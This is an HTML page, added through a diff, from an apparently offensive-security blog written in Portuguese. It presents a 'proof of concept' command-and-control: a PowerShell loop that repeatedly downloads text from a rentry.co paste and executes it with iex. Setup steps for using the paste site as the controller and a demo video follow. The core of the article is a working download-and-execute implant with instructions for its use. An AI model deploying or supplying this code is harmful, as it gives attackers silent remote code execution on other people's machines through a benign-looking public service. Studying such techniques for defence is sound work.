@@ -1,1 +1,158 @@
-The template name has zero length, please check the "template" field in your Notion table.
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>My Little Power Comand and Control&nbsp;|&nbsp;www.offensivethink.com</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="My Little Power Comand and Control">
+  
+    <meta name="description" content="Um pequeno teste de utilização apenas de powershell e ferramenta gratuita de hospedagem de textos para simular um pequeno command and control. ">
+    <meta property="og:description" content="Um pequeno teste de utilização apenas de powershell e ferramenta gratuita de hospedagem de textos para simular um pequeno command and control. ">
+  
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="index.html">
+    <div class="Navbar__Btn">
+      
+      <span>Home</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="referencia-rapida.html">
+        <div class="Navbar__Btn">
+          
+          <span>→ Referência rápida ← </span>
+        </div>
+      </a>
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="contacts.html">
+        <div class="Navbar__Btn">
+          
+            <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F12e48681-f6a0-41cb-aa1f-73a46f35c5d3%2FOffensiveThink_Logo_Negative_notion_-_280x280.png?table=block&amp;id=ca933149-5245-4511-a885-9cf5922808e1"></span>&nbsp;
+          
+          <span>about &amp; contacts</span>
+        </div>
+      </a>
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="offensivetools.html">
+        <div class="Navbar__Btn">
+          
+          <span>Offensive Tools</span>
+        </div>
+      </a>
+    
+  
+</nav>
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+    <h1 class="Header__Title_post">My Little Power Comand and Control</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Wed, Mar 30, 2022</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/#powershell.html">#powershell</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/2de15f002a164e26bd4af7a1d29b2298" class="PageRoot"><h1 id="https://www.notion.so/10b81ed2e3dc412f8c1f0aa5ce1941da" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/10b81ed2e3dc412f8c1f0aa5ce1941da"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">A Ideia</span></span></h1><div id="https://www.notion.so/701787691141472aa446188a7ec5e7e8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Usar sites públicos sem fins maliciosos que hospedam pequenos pedaços de texto, como dontpad.com, etc. , para passar comandos para um powershell, também “não malicioso” gentilmente hospedado em um servidor/estação. </span></span></p></div><h1 id="https://www.notion.so/8a3f786f057d41ba8303b1c9133445e3" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/8a3f786f057d41ba8303b1c9133445e3"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">O Powershell</span></span></h1><div id="https://www.notion.so/4e55e4f63d86430295f63b9d1b4e1f05" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Esse código não sofreu nenhuma otimização , ofuscamento ou qualquer coisa do tipo, por se tratar apenas de uma prova de conceito para estudos. </span></span></p></div><pre id="https://www.notion.so/e659df8f59f64e0d932a318a2940acfb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token variable">$urlc2</span>=<span class="token string">"https://rentry.co/XXXXX/raw"</span> <span class="token comment"># URL personalizada. XXXXX = Identificador único</span>
+<span class="token variable">$c0</span>=<span class="token string">""</span>
+<span class="token keyword">while</span><span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$c1</span>=<span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token variable">$urlc2</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$c1</span> <span class="token operator">-ne</span> <span class="token variable">$c0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+         <span class="token function">iex</span> <span class="token variable">$c1</span>
+         <span class="token variable">$c0</span>=<span class="token variable">$c1</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token comment"># Timer, apenas para não ficar consumindo recursos o tempo todo!</span>
+<span class="token punctuation">}</span></span></span></span></code></pre><div id="https://www.notion.so/42755d358ff641b6a405d79cc7c424c7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h1 id="https://www.notion.so/704ca3dae1f94160b12997b660001697" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/704ca3dae1f94160b12997b660001697"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">O Site controlador</span></span></h1><div id="https://www.notion.so/6faa921140114318b012da118a84e6a8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Utilizamos o </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://rentry.co/">https://rentry.co</a></span></span></p></div><div id="https://www.notion.so/d154d2bbd4b541618c78785e60e1661c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Acesse o site, digite o código powershell que deseja executar no server (Ex.: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Get-Process</code></span><span class="SemanticString">) , clique em </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">GO</strong></span><span class="SemanticString"> </span></span></p></div><div id="https://www.notion.so/41d5f14184a440198d7201aa674261e5" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F16ac7d0f-7b81-484a-acba-c2b5358d40f0%2FUntitled.png?width=500&amp;table=block&amp;id=41d5f141-84a4-4019-8d72-01aa674261e5"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F16ac7d0f-7b81-484a-acba-c2b5358d40f0%2FUntitled.png?width=500&amp;table=block&amp;id=41d5f141-84a4-4019-8d72-01aa674261e5" style="width:500px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/a377f473341b40e5b462609494853edf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Na tela seguinte anote o seu código de edição, você precisará para trocar os comandos: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Your Edit Code</code></span><span class="SemanticString"> e a sua URL. Essa URL, deverá ser colocada na variável </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$urlc2</code></span><span class="SemanticString"> adicionando a string </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/raw</code></span><span class="SemanticString"> no powershell script acima. </span></span></p></div><div id="https://www.notion.so/4cdc2a2c0b1a4e9fa53047f48cbc3da7" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F598db4d1-dbb1-4a99-b89b-8950e385852c%2FUntitled.png?width=400&amp;table=block&amp;id=4cdc2a2c-0b1a-4e9f-a530-47f48cbc3da7"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F598db4d1-dbb1-4a99-b89b-8950e385852c%2FUntitled.png?width=400&amp;table=block&amp;id=4cdc2a2c-0b1a-4e9f-a530-47f48cbc3da7" style="width:400px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/28de9013a9674596be9a388725e27eaf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h1 id="https://www.notion.so/9449d6c98e9f45a8b1908743d1a23028" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/9449d6c98e9f45a8b1908743d1a23028"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Talk is Cheap, Show me the Execution! </span></span></h1><div id="https://www.notion.so/0e37f04936604af1aab3655177f36fc2" class="Embed"><div class="Embed__Content"><div class="Embed__ResponsiveContainer" style="width:854px;padding-bottom:56.20608899297424%"><iframe src="https://www.youtube.com/embed/tW-yMnT9Hvw?feature=oembed" sandbox="allow-scripts allow-popups allow-forms allow-same-origin" allowfullscreen=""></iframe></div></div><p class="Embed__Caption"><span class="SemanticStringArray"></span></p></div><h1 id="https://www.notion.so/5f79b2969a0849779595006b68265876" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/5f79b2969a0849779595006b68265876"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Possibilidades!</span></span></h1><div id="https://www.notion.so/2d03adfdf8fb475eafa635e8e7b2fecd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Muitas. ;D </span></span></p></div><div id="https://www.notion.so/e2775afb78574a578a904f31849f1f3d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">É só uma prova de conceito e como tal é usada apenas para fins de estudo e verificar as possibilidades de execução de comandos em uma máquina terceira, neste caso, “cegamente”, já que o controlador não tem o retorno do comando. Mas isso dá pra implementar facilmente.  Talvez eu mostre a implementação que fiz na segunda parte ;D </span></span></p></div><div id="https://www.notion.so/ded1166727dc414eb70990051ef6a79a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></article>
+  <footer class="Footer">
+  <div>&copy; www.offensivethink.com 2019-2021</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+</body>
+
+</html>
